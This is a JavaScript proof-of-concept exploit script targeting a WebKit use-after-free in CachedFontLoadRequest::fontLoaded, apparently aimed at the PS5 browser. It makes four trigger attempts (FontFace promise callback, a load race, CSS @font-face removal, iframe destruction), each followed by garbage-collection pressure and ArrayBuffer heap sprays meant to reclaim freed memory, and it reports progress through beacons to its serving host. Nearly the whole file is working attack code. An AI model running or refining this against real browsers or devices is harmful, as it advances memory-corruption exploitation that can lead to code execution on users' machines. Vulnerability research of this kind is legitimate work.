// p185 — CachedFontLoadRequest::fontLoaded UAF
// WebKit Bug 263400 — Font object destroyed during fontLoaded callback
// Fixed Oct 20, 2023 (Safari 17.1). PS5 runs 17.0 = VULNERABLE.
//
// Root cause: CachedFontLoadRequest::fontLoaded calls
// m_fontLoadRequestClient->fontLoaded(*this) which can destroy the
// CSSFontFace → CSSFontFaceSource → CachedFontLoadRequest chain.
// After the callback returns, CachedFontLoadRequest accesses m_font
// which was already destroyed.
//
// Trigger: Create FontFace, add to document.fonts, start loading,
// then during the load callback drop all references so the FontFace
// is destroyed while the internal fontLoaded is still on the stack.
//
// Beacon prefix: V185-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V185-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Minimal valid TrueType font (empty glyph, single cmap entry)
  // This is a ~300 byte minimal TTF that defines a single space glyph
  // Base64 encoded
  var MINI_TTF_B64 =
    "AAEAAAAKAIAAAwAgT1MvMgAAAAAAAAEoAAAAVmNtYXAA" +
    "AAAAAAABYAAAAGRHYWDWAAAAAAAAABQAAAAYZ2x5ZgAA" +
    "AAAAAAHMAAAAFGhlYWQAAAAAAAAB4AAAADZ" +
    "oaGVhAAAAAAAABBgAAAAkaG10eAAAAAAAAAQ8AAAACG" +
    "xvY2EAAAAAAAAERAAAAAxtYXhwAAAAAAAABFAAAAAgbm" +
    "FtZQAAAAAAAARwAAAAOXBvc3QAAAAAAAAEqAAAABAAA" +
    "QAAAAEAAHhJLflfDzz1AAsIAAAAAADYsmaYAAAAANiy" +
    "ZpgAAP/sAAABxAABAAAACAACAAAAAAAAAAEAAAHE/+w" +
    "AAAAAAAD//wAAAAEAAAAAAAAAAAAAAAAAAAACAAEAAA" +
    "ACAAoAAQAAAAAAAgAAAAoACgAAAP8AAAAAAAAAAAAA" +
    "AAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAIAAgAAAA" +
    "oACgAAAP8AAAAAAAAAAAAAAAAAAAABAAAABAAAAAAA" +
    "AAAAAAIAABAAQABkAAAAAAAAAgAA//8AAgABAAAAAAAA" +
    "AAIAADkDAAEAAAAAAAAAAAAKAA0AAQAAAAEAAAABAAAA" +
    "AQAAAAoAHgAcAAJERkxUAA5sYXRuAA4ABAAAAAD//w" +
    "AAAAAAAAAAAAAAAAAAAA==";

  // Attempt 1: Load font via FontFace API, drop reference in loaded callback
  function attempt1(n) {
    syncB('A1-' + n + '-START');

    try {
      var dataUrl = 'data:font/ttf;base64,' + MINI_TTF_B64;
      var face = new FontFace('uaf-test-' + n, 'url(' + dataUrl + ')');

      // Add to document.fonts so it triggers the full loading pipeline
      document.fonts.add(face);
      syncB('A1-' + n + '-ADDED');

      // Start loading
      var loadPromise = face.load();

      loadPromise.then(function(loadedFace) {
        syncB('A1-' + n + '-LOADED-CB');

        // During this callback, the internal fontLoaded chain is executing.
        // Drop ALL references to the FontFace to trigger destruction.
        document.fonts.delete(loadedFace);
        face = null;
        loadedFace = null;
        loadPromise = null;

        // Force GC to destroy the FontFace/CSSFontFace chain
        for (var g = 0; g < 50000; g++) {
          var tmp = { a: g, b: [g, g+1] };
        }

        // Spray to reclaim freed CachedFontLoadRequest memory
        var sprays = [];
        for (var s = 0; s < 200; s++) {
          var ab = new ArrayBuffer(256);
          var v = new Uint32Array(ab);
          v[0] = 0xDEADBEEF;
          v[1] = 0xCAFEBABE;
          for (var j = 2; j < v.length; j++) v[j] = 0x41414141;
          sprays.push(ab);
        }

        syncB('A1-' + n + '-POST-FREE');
      }).catch(function(e) {
        syncB('A1-' + n + '-LOAD-ERR-' + (e.message || e.name || '').substring(0, 30));
        // Remove from fonts even on error
        try { document.fonts.delete(face); } catch(e2) {}
        face = null;
      });
    } catch(e) {
      syncB('A1-' + n + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Attempt 2: Race condition — delete FontFace while load is in progress
  // Don't wait for the promise; remove immediately after calling load()
  function attempt2(n) {
    syncB('A2-' + n + '-START');

    try {
      var dataUrl = 'data:font/ttf;base64,' + MINI_TTF_B64;
      var face = new FontFace('uaf-race-' + n, 'url(' + dataUrl + ')');

      document.fonts.add(face);

      // Start loading but immediately remove and null everything
      face.load();

      // Immediately drop all references
      document.fonts.delete(face);
      face = null;

      // GC pressure
      for (var g = 0; g < 100000; g++) {
        var tmp = new ArrayBuffer(64);
      }

      syncB('A2-' + n + '-DROPPED');

      // Spray
      var sprays = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(128);
        var v = new Uint32Array(ab);
        v[0] = 0xBAADF00D;
        sprays.push(ab);
      }

      syncB('A2-' + n + '-SPRAYED');
    } catch(e) {
      syncB('A2-' + n + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Attempt 3: Use CSS @font-face + style element removal
  // Create a style element with @font-face, trigger load, remove style
  function attempt3(n) {
    syncB('A3-' + n + '-START');

    try {
      var dataUrl = 'data:font/ttf;base64,' + MINI_TTF_B64;
      var style = document.createElement('style');
      style.textContent =
        '@font-face { font-family: "css-uaf-' + n + '"; src: url(' + dataUrl + '); }';
      document.head.appendChild(style);

      // Create element that uses the font to trigger loading
      var div = document.createElement('div');
      div.style.fontFamily = '"css-uaf-' + n + '"';
      div.textContent = 'ABCDEFGHIJKLMNOP';
      document.body.appendChild(div);

      syncB('A3-' + n + '-INJECTED');

      // Wait a tick for font loading to start, then rip out the style
      setTimeout(function() {
        // Remove the style element — this orphans the CSSFontFace
        style.remove();
        style = null;

        // Also remove the div so nothing references the font
        div.remove();
        div = null;

        // GC
        for (var g = 0; g < 50000; g++) {
          var tmp = { x: g };
        }

        syncB('A3-' + n + '-REMOVED');

        // Spray
        var sprays = [];
        for (var s = 0; s < 300; s++) {
          sprays.push(new ArrayBuffer(256));
        }

        syncB('A3-' + n + '-POST');
      }, 0);
    } catch(e) {
      syncB('A3-' + n + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Attempt 4: iframe font load + destroy iframe
  // Load font inside iframe, destroy iframe during load callback
  function attempt4(n) {
    syncB('A4-' + n + '-START');

    try {
      var f = document.createElement('iframe');
      document.body.appendChild(f);
      var iDoc = f.contentDocument;
      var iWin = f.contentWindow;

      if (!iDoc || !iWin) {
        syncB('A4-' + n + '-NO-DOC');
        return;
      }

      var dataUrl = 'data:font/ttf;base64,' + MINI_TTF_B64;

      // Create FontFace inside iframe
      var face;
      try {
        face = new iWin.FontFace('iframe-uaf-' + n, 'url(' + dataUrl + ')');
      } catch(e) {
        syncB('A4-' + n + '-FF-ERR');
        return;
      }

      iDoc.fonts.add(face);

      face.load().then(function() {
        syncB('A4-' + n + '-LOADED');
      }).catch(function() {
        syncB('A4-' + n + '-LOAD-FAIL');
      });

      // Destroy iframe immediately — kills the document while font loads
      f.remove();
      f = null;
      face = null;

      // GC pressure
      for (var g = 0; g < 100000; g++) {
        var tmp = { a: g };
      }

      // Spray
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(256);
        var v = new Uint32Array(ab);
        v[0] = 0x42424242;
      }

      syncB('A4-' + n + '-DESTROYED');
    } catch(e) {
      syncB('A4-' + n + '-ERR-' + (e.message || '').substring(0, 30));
    }
  }

  // Run all attempts
  for (var i = 0; i < 3; i++) attempt1(i);
  for (var i = 0; i < 5; i++) attempt2(i);
  for (var i = 0; i < 3; i++) attempt3(i);
  for (var i = 0; i < 5; i++) attempt4(i);

  // Final check — if we get here, no crash from any attempt
  setTimeout(function() {
    syncB('ALL-COMPLETE');
  }, 2000);

})();
